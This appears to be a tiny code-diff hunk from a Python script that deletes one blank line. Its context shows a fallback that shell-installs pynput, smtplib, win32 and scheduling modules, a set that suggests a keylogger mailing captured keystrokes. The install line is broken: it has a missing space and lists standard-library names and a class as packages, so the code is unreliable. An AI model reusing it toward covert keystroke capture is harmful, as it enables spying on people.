@@ -12,7 +12,6 @@ try:
     import os, sys, time, uuid
 except ModuleNotFoundError:
     from subprocess import call
-
     packets = ["pynput", "smtplib", "email", "schedule", "win32con", "win32api", "MIMEMultipart"]
     call("pip install" + ' '.join(packets), shell=True)
 finally:
